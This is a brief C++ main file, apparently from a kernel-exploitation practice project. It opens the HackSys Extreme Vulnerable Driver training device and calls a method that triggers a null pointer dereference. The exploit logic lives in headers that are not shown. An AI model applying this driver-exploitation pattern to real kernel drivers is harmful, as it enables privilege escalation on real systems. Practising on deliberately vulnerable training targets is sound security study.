#include <Windows.h>
#include <iostream>

#include "ioctal_codes.h"
#include "utils.h"
#include "Solutions.h"

using namespace std;

int main()
{
	LPCWSTR lpFileName = L"\\\\.\\HacksysExtremeVulnerableDriver";

	HANDLE hDeviceHandle = CreateFile(lpFileName,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hDeviceHandle == INVALID_HANDLE_VALUE) {
		cout << "[-] ERROR: invalid handle" << endl;
		return 1;
	}

	Solutions* solutions = new Solutions(hDeviceHandle);
	DWORD res = solutions->TriggerNullPointerDereference();

	return res;
}